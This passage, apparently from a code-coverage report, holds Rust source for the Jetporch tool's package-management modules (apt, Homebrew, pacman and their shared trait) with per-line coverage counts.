\n    }\n\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e {\n        return self.version.clone();\n    }\n\n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        /* need to implement so update returns the correct modification status */\n        let cmd = format!(\"apt-cache show {} | grep Version | cut -f2 --delimiter=':'\", self.package.clone());\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                // (differentiated return code is unavailable for this module only, don't repeat this pattern)\n                if out.contains(\"No packages found\") {\n                    return Ok(None);\n                }\n                if rc == 0 {\n                    let details = self.parse_remote_package_details(handle, \u0026out.clone());\n                    return details;\n                } else {\n                    return Ok(None);\n                }\n            },\n            Err(e) =\u003e {\n                return Err(e);\n            }\n        }\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n        let cmd = format!(\"dpkg -s '{}' \u003e/dev/null\", self.package);\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,_out) = cmd_info(\u0026r);\n                if rc != 0 {\n                    return Ok(None);\n                }\n            },\n            Err(e) =\u003e return Err(e)\n        }\n\n        let cmd = format!(\"dpkg-query -W '{}'\", self.package);\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                if rc == 0 {\n                    let details = self.parse_local_package_details(handle, \u0026out.clone())?;\n                    return Ok(details);\n                } else {\n                    return Ok(None);\n                }\n            },\n            Err(e) =\u003e return Err(e)\n        }\n    }\n\n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"DEBIAN_FRONTEND=noninteractive apt-get install '{}' -qq\", self.package),\n            false =\u003e format!(\"DEBIAN_FRONTEND=noninteractive apt-get install '{}={}' -qq\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"DEBIAN_FRONTEND=noninteractive apt-get install '{}' --only-upgrade -qq\", self.package),\n            false =\u003e format!(\"DEBIAN_FRONTEND=noninteractive apt-get install '{}={}' --only-upgrade -qq\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"DEBIAN_FRONTEND=noninteractive apt-get remove '{}' -qq\", self.package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n\nimpl AptAction {\n\n    pub fn parse_local_package_details(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let mut tokens = out.split(\"\\t\");\n        let version = tokens.nth(1);\n        return match version {\n            Some(v) =\u003e {\n                Ok(Some(PackageDetails { name: self.package.clone(), version: v.trim().to_string() }))\n            },\n            None =\u003e {\n                Ok(None)\n            }\n        };\n    }\n\n    pub fn parse_remote_package_details(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(Some(PackageDetails { name: self.package.clone(), version: out.trim().to_string() }));\n    }\n\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":2}},{"line":47,"address":[],"length":0,"stats":{"Line":1}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":79},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","common.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::{TaskHandle};\nuse crate::tasks::fields::Field;\nuse std::sync::Arc;\n\n#[derive(Clone,PartialEq,Debug)]\npub struct PackageDetails {\n    pub name: String,\n    pub version: String,\n}\n\npub trait PackageManagementModule {\n\n    fn is_update(\u0026self) -\u003e bool;\n    fn is_remove(\u0026self) -\u003e bool;\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e;\n\n    fn initial_setup(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e;\n            \n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e;\n                \n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e;\n\n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e;\n    \n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e;\n    \n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e;\n    \n    fn common_package_query(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        \n        let mut changes : Vec\u003cField\u003e = Vec::new();\n\n        self.initial_setup(handle, request)?;\n        \n        let package_details = self.get_local_version(handle, request)?; \n\n        if package_details.is_some() {\n            // package is installed\n            if self.is_remove() {\n                return Ok(handle.response.needs_removal(request));\n            }\n            let pkg = package_details.unwrap();\n            let version = self.get_version();\n\n            if self.is_update() {\n                let remote_details = self.get_remote_version(handle, request)?;\n                if remote_details.is_none() || !pkg.version.eq(\u0026remote_details.unwrap().version) {\n                    changes.push(Field::Version);\n                }\n            } else if version.is_some() {\n                let specified_version = version.as_ref().unwrap();\n                if ! pkg.version.eq(specified_version) { changes.push(Field::Version); }\n            }\n        \n            if changes.len() \u003e 0 {\n                return Ok(handle.response.needs_modification(request, \u0026changes));\n            } else {\n                return Ok(handle.response.is_matched(request));\n            }\n        } else {\n            // package is not installed\n            return match self.is_remove() {\n                true =\u003e Ok(handle.response.is_matched(request)),\n                false =\u003e Ok(handle.response.needs_creation(request))\n            }\n        }    \n    }\n\n    fn common_dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return self.common_package_query(handle, request);\n            },\n\n            TaskRequestType::Create =\u003e {\n                self.install_package(handle, request)?;               \n                return Ok(handle.response.is_created(request));\n            }\n\n            TaskRequestType::Modify =\u003e {\n                if request.changes.contains(\u0026Field::Version) {\n                    self.update_package(handle, request)?;\n                }\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            }\n\n            TaskRequestType::Remove =\u003e {\n                self.remove_package(handle, request)?;\n                return Ok(handle.response.is_removed(request));\n            }\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n}","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":37},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","homebrew.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::modules::packages::common::{PackageManagementModule,PackageDetails};\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse serde::{Deserialize};\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"homebrew\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct HomebrewTask {\n    pub name: Option\u003cString\u003e,\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub remove: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct HomebrewAction {\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: bool,\n    pub remove: bool,\n}\n\nimpl IsTask for HomebrewTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(HomebrewAction {\n                    package:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"package\"), \u0026self.package)?,\n                    version:    handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"version\"), \u0026self.version)?,\n                    update:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?)\n            }\n        );\n    }\n\n}\n\nimpl IsAction for HomebrewAction {\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        return self.common_dispatch(handle,request);\n    }\n}\n\nimpl PackageManagementModule for HomebrewAction {\n\n    fn initial_setup(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        // nothing to do here, see how this was used in yum_dnf.rs\n        return Ok(());\n    }\n\n    fn is_update(\u0026self) -\u003e bool {\n        return self.update;\n    }\n\n    fn is_remove(\u0026self) -\u003e bool {\n        return self.remove;\n    }\n\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e {\n        return self.version.clone();\n    }\n\n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"brew info {} | head -n 1 | cut -f 4 -d ' '\", self.package.clone());\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                if rc == 0 {\n                    let details = self.parse_remote_package_details(handle, \u0026out.clone());\n                    return details;\n                } else {\n                    return Ok(None);\n                }\n            },\n            Err(e) =\u003e {\n                return Err(e);\n            }\n        }\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"brew info {}\", self.package);\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                if rc == 0 {\n                    let details = self.parse_local_package_details(handle, \u0026out.clone())?;\n                    return Ok(details);\n                } else {\n                    return Ok(None);\n                }\n            },\n            Err(e) =\u003e return Err(e)\n        }\n    }\n\n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"brew install '{}'\", self.package),\n            false =\u003e format!(\"brew install '{}@{}'\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"brew upgrade '{}'\", self.package),\n            false =\u003e format!(\"brew upgrade '{}@{}'\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"brew uninstall '{}'\", self.package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n\nimpl HomebrewAction {\n\n    pub fn parse_local_package_details(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let mut version: Option\u003cString\u003e = None;\n\n        for line in out.lines() {\n            if line.starts_with('/') {\n                let path_version = line.split(\" \").nth(0).unwrap().trim();\n                version = Some(path_version.split(\"/\").last().unwrap().trim().to_string());\n            }\n            // homebrew puts an asterisk next to the currently installed version\n            if line.trim().ends_with('*') {\n                break;\n            }\n            // once homebrew has printed the versions, it starts printing other stuff\n            if line.starts_with(\"From:\") {\n                break;\n            }\n        }\n        return match version {\n            Some(v) =\u003e {\n                Ok(Some(PackageDetails { name: self.package.clone(), version: v.trim().to_string() }))\n            },\n            None =\u003e {\n                Ok(None)\n            }\n        };\n    }\n\n    pub fn parse_remote_package_details(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(Some(PackageDetails { name: self.package.clone(), version: out.trim().to_string() }));\n    }\n\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":2}},{"line":47,"address":[],"length":0,"stats":{"Line":1}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":75},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod common;\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod apt;\npub mod homebrew;\npub mod pacman;\npub mod yum_dnf;\npub mod zypper;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","pacman.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse crate::modules::packages::common::{PackageManagementModule,PackageDetails};\nuse serde::{Deserialize};\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"pacman\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct PacmanTask {\n    pub name: Option\u003cString\u003e,\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub remove: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct PacmanAction {\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: bool,\n    pub remove: bool,\n}\n\nimpl IsTask for PacmanTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn 